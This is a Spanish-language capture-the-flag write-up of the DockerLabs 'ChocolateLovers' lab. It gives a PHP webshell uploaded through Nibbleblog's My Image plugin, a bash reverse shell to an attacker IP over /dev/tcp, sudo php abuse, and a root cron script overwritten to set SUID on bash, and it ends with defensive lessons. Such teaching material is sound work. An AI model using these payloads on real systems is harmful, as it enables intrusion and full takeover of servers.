# ChocolateLovers — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 26/06/2024  
**Técnicas:** Nmap · Nibbleblog 4.0.3 · Plugin My Image (file upload) · Reverse Shell · php/sudo → chocolate · pspy64 · Script CRON root · bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Nibbleblog en directorio oculto](#2-enumeración-web--nibbleblog-en-directorio-oculto)
3. [Acceso al panel admin — credenciales por defecto](#3-acceso-al-panel-admin--credenciales-por-defecto)
4. [Explotación — Plugin My Image con file upload sin restricciones](#4-explotación--plugin-my-image-con-file-upload-sin-restricciones)
5. [Reverse Shell](#5-reverse-shell)
6. [Escalada a chocolate con php/sudo](#6-escalada-a-chocolate-con-phpsudo)
7. [Pspy64 + CRON root → bash -p](#7-pspy64--cron-root--bash--p)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh chocolatelovers.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
| http-title: Apache2 Ubuntu Default Page: It works
```

Solo puerto 80.

---

## 2. Enumeración web — Nibbleblog en directorio oculto

La web muestra la página por defecto de Apache. Inspeccionamos el código fuente de `index.html`:

```html
<!-- /nibbleblog -->
<!-- /nibbleblog -->
<!-- /nibbleblog -->
```

Navegamos a `http://172.17.0.2/nibbleblog`:

```
chocolate lovers  chocolate lovers
Welcome to Nibbleblog
```

Es un **blog de Nibbleblog** con el botón de login en `http://172.17.0.2/nibbleblog/admin.php`.

---

## 3. Acceso al panel admin — credenciales por defecto

Probamos credenciales por defecto:

```
Usuario: admin
Contraseña: admin
```

Accedemos al dashboard. La versión es **Nibbleblog 4.0.3 "Coffee"** — buscamos vulnerabilidades conocidas y encontramos en INCIBE que esta versión tiene una vulnerabilidad en el plugin **My Image** que permite subir archivos sin validación de tipo.

---

## 4. Explotación — Plugin My Image con file upload sin restricciones

Desde el dashboard: **Plugins → My Image → Install**.

Una vez instalado, el plugin permite subir imágenes pero no valida el tipo real del archivo. Creamos una webshell PHP:

```bash
nano image.php
```

```php
<?php
system($_GET['cmd']);
?>
```

Subimos `image.php` como si fuera una imagen. El archivo queda en:

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php
```

Comprobamos ejecución:

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ RCE confirmada.

---

## 5. Reverse Shell

Ponemos Netcat a escuchar:

```bash
sudo nc -lvnp 443
```

Desde [revshells.com](https://www.revshells.com/) generamos el payload Bash (IP 192.168.1.26, puerto 443) y lo enviamos URL-encodeado:

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash%20-i%20>%26%20/dev/tcp/192.168.1.26/443%200>%261
```

Recibimos conexión:

```bash
www-data@f7b3076d9573:/html/nibbleblog/content/private/plugins/my_image$
```

---

## 6. Escalada a chocolate con php/sudo

```bash
www-data@f7b3076d9573:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
```

```
User www-data may run the following commands on f7b3076d9573:
    (chocolate) NOPASSWD: /usr/bin/php
```

GTFObins para php con sudo como otro usuario:

```bash
www-data@f7b3076d9573:/var/www/html$ CMD="/bin/sh"
www-data@f7b3076d9573:/var/www/html$ sudo -u chocolate /usr/bin/php -r "system('$CMD');"
$ whoami
chocolate
```

---

## 7. Pspy64 + CRON root → bash -p

Como chocolate, ni sudo ni SUID funcionan. Descargamos pspy64:

```bash
# Atacante:
python3 -m http.server 8000

# Víctima:
wget http://192.168.1.26:8000/pspy64
chmod +x pspy64
./pspy64
```

```
2025/09/22 19:09:49 CMD: UID=0   PID=649   | php /opt/script.php
```

Root ejecuta `/opt/script.php` periódicamente. Verificamos permisos:

```bash
$ ls -la /opt/script.php
-rw-r--r-- 1 chocolate chocolate 59 May 7 2024 /opt/script.php
```

El fichero pertenece al usuario chocolate. Lo sobreescribimos:

```bash
$ echo "<?php system('chmod u+s /bin/bash'); ?>" > /opt/script.php
$ cat /opt/script.php
<?php system('chmod u+s /bin/bash'); ?>
```

Esperamos unos segundos a que root lo ejecute y lanzamos bash con privilegios preservados:

```bash
$ bash -p
bash-5.0# whoami
root
```

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Nibbleblog con credenciales por defecto (admin:admin)** | Panel admin | Acceso al dashboard |
| **Plugin My Image sin validación de tipo de archivo** | File upload del plugin | Upload de webshell PHP → RCE |
| **php con sudo como usuario chocolate** | Sudoers www-data | Escalada horizontal |
| **Script CRON de root con permisos de escritura del usuario** | `/opt/script.php` | Escalada a root |

**Para defenderse:**
- Cambiar siempre las credenciales por defecto inmediatamente tras instalar cualquier CMS.
- Los plugins de CMS deben validar el tipo MIME real del archivo, no solo la extensión.
- Los scripts ejecutados por cron de root no deben ser escribibles por usuarios sin privilegios. Permisos correctos: `root:root 700`.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
